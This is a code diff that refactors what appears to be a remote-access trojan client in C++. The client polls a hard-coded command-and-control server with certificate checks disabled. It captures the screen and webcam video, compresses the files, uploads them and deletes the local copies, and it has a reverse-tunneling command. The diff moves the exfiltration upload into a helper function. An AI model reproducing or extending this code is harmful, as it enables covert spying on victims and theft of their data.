@@ -5,6 +5,7 @@
 #include <chrono>
 #include <cstdio>
 #include <thread>
+#include <filesystem>
 #include <curl/curl.h>
 #include "zlib.h"
 #include "ScreenCapture.h"
@@ -78,6 +79,48 @@ void performLogout(CURL* curl, const char* logoutUrl, const char* cookies) {
         std::cout << "Logout successful!" << std::endl;
     }
 }
+
+void performFileUpload(CURL* curl, const char* uploadUrl, const char* commandsUrl, const char* compressedArchivePath, const CommandInfo& commandInfo, const std::string& csrfToken) {
+    // Reset cURL options
+    curl_easy_reset(curl);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    curl_easy_setopt(curl, CURLOPT_URL, uploadUrl);
+    curl_easy_setopt(curl, CURLOPT_POST, 1L);
+    curl_easy_setopt(curl, CURLOPT_REFERER, commandsUrl);
+
+    // Set up the form data
+    struct curl_httppost* post = nullptr;
+    struct curl_httppost* last = nullptr;
+
+    curl_formadd(&post, &last, CURLFORM_COPYNAME, "file", CURLFORM_FILE, compressedArchivePath, CURLFORM_END);
+    curl_formadd(&post, &last, CURLFORM_COPYNAME, "command", CURLFORM_COPYCONTENTS, commandInfo.command.c_str(), CURLFORM_END);
+    curl_formadd(&post, &last, CURLFORM_COPYNAME, "extra", CURLFORM_COPYCONTENTS, commandInfo.extra.c_str(), CURLFORM_END);
+    curl_formadd(&post, &last, CURLFORM_COPYNAME, "uuid", CURLFORM_COPYCONTENTS, commandInfo.uuid.c_str(), CURLFORM_END);
+    curl_formadd(&post, &last, CURLFORM_COPYNAME, "csrf_token", CURLFORM_COPYCONTENTS, csrfToken.c_str(), CURLFORM_END);
+
+    curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
+
+    // Perform the file upload
+    CURLcode res = curl_easy_perform(curl);
+
+    // Free the form data
+    curl_formfree(post);
+
+    if (res != CURLE_OK) {
+        std::cerr << "cURL Error (file upload): " << curl_easy_strerror(res) << std::endl;
+    } else {
+        std::cout << "File uploaded successfully!" << std::endl;
+
+        // Delete the compressed archive
+        if (remove(compressedArchivePath) == 0) {
+            std::cout << "Compressed archive deleted successfully!" << std::endl;
+        } else {
+            std::cerr << "Error deleting compressed archive!" << std::endl;
+        }
+    }
+}
+
 
 int main() {
     const char* loginUrl = "https://16.16.16.114:5000/login";
@@ -170,43 +213,12 @@ int main() {
             const char* outputArchiveNamePatternBMP = "*.bmp";
             std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePatternBMP);
 
-            deleteFiles(outputArchiveNamePatternBMP);
+            deleteFiles("bmp"); 
+
 
             std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;
 
-            curl_easy_reset(curl);
-            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-            curl_easy_setopt(curl, CURLOPT_URL, uploadUrl);
-            curl_easy_setopt(curl, CURLOPT_POST, 1L);
-            curl_easy_setopt(curl, CURLOPT_REFERER, commandsUrl);
-
-            struct curl_httppost* post = nullptr;
-            struct curl_httppost* last = nullptr;
-
-            curl_formadd(&post, &last, CURLFORM_COPYNAME, "file", CURLFORM_FILE, compressedArchivePath.c_str(), CURLFORM_END);
-            curl_formadd(&post, &last, CURLFORM_COPYNAME, "command", CURLFORM_COPYCONTENTS, commandInfo.command.c_str(), CURLFORM_END);
-            curl_formadd(&post, &last, CURLFORM_COPYNAME, "extra", CURLFORM_COPYCONTENTS, "", CURLFORM_END);
-            curl_formadd(&post, &last, CURLFORM_COPYNAME, "uuid", CURLFORM_COPYCONTENTS, commandInfo.uuid.c_str(), CURLFORM_END);
-            curl_formadd(&post, &last, CURLFORM_COPYNAME, "csrf_token", CURLFORM_COPYCONTENTS, csrfToken.c_str(), CURLFORM_END);
-
-            curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
-
-            res = curl_easy_perform(curl);
-
-            curl_formfree(post);
-
-            if (res != CURLE_OK) {
-                std::cerr << "cURL Error (file upload): " << curl_easy_strerror(res) << std::endl;
-            } else {
-                std::cout << "File uploaded successfully!" << std::endl;
-                
-                if (remove(compressedArchivePath.c_str()) == 0) {
-                    std::cout << "Compressed archive deleted successfully!" << std::endl;
-                } else {
-                    std::cerr << "Error deleting compressed archive!" << std::endl;
-                }
-            }
+            performFileUpload(curl, uploadUrl, commandsUrl, compressedArchivePath.c_str(), commandInfo, csrfToken);
             
         } else if (commandInfo.command == "get_camera") {
             std::cout << "Extracted Command: " << commandInfo.command << std::endl;
@@ -220,43 +232,11 @@ int main() {
             const char* outputArchiveNamePatternBMP = "*.avi";
             std::string compressedArchivePath = compressFilesInCurrentDirectory(outputArchiveNamePatternBMP);
 
-            deleteFiles(outputArchiveNamePatternBMP);
+            deleteFiles("avi"); //
 
             std::cout << "Compressed archive path: " << compressedArchivePath << std::endl;
 
-            curl_easy_reset(curl);
-            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-            curl_easy_setopt(curl, CURLOPT_URL, uploadUrl);
-            curl_easy_setopt(curl, CURLOPT_POST, 1L);
-            curl_easy_setopt(curl, CURLOPT_REFERER, commandsUrl);
-
-            struct curl_httppost* post = nullptr;
-            struct curl_httppost* last = nullptr;
-
-            curl_formadd(&post, &last, CURLFORM_COPYNAME, "file", CURLFORM_FILE, compressedArchivePath.c_str(), CURLFORM_END);
-            curl_formadd(&post, &last, CURLFORM_COPYNAME, "command", CURLFORM_COPYCONTENTS, commandInfo.command.c_str(), CURLFORM_END);
-            curl_formadd(&post, &last, CURLFORM_COPYNAME, "extra", CURLFORM_COPYCONTENTS, "", CURLFORM_END);
-            curl_formadd(&post, &last, CURLFORM_COPYNAME, "uuid", CURLFORM_COPYCONTENTS, commandInfo.uuid.c_str(), CURLFORM_END);
-            curl_formadd(&post, &last, CURLFORM_COPYNAME, "csrf_token", CURLFORM_COPYCONTENTS, csrfToken.c_str(), CURLFORM_END);
-
-            curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
-
-            res = curl_easy_perform(curl);
-
-            curl_formfree(post);
-
-            if (res != CURLE_OK) {
-                std::cerr << "cURL Error (file upload): " << curl_easy_strerror(res) << std::endl;
-            } else {
-                std::cout << "File uploaded successfully!" << std::endl;
-
-                if (remove(compressedArchivePath.c_str()) == 0) {
-                    std::cout << "Compressed archive deleted successfully!" << std::endl;
-                } else {
-                    std::cerr << "Error deleting compressed archive!" << std::endl;
-                }
-            }
+            performFileUpload(curl, uploadUrl, commandsUrl, compressedArchivePath.c_str(), commandInfo, csrfToken);
             
         } else if (commandInfo.command == "rev_tun_port") {
             std::cout << "Executing reverse tunneling..." << std::endl;
